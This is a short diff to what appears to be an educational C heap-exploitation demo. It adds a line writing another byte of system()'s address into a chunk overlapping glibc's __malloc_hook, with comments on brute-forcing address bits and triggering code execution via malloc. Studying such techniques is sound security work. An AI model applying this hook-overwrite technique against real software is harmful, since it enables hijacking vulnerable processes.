@@ -334,6 +334,7 @@ int main(){
 
 	malloc_hook_chunk[20] = (system_addr >> 8) & 0xff;  // The last 4 bits of this must be brute forced (done previously already).
 	malloc_hook_chunk[21] = (system_addr >> 16) & 0xff;  // The last byte is the remaining 8 bits that must be brute forced.
+	malloc_hook_chunk[22] = (system_addr >> 24) & 0xff; // If the gap is between the data and text section is super wide, this is also needed. Just putting this in to be safe.
 
 	// Trigger the malloc call for code execution via the system call being ran from the __malloc_hook.
 	// In a real example, you would probably want to use a one_gadget. 
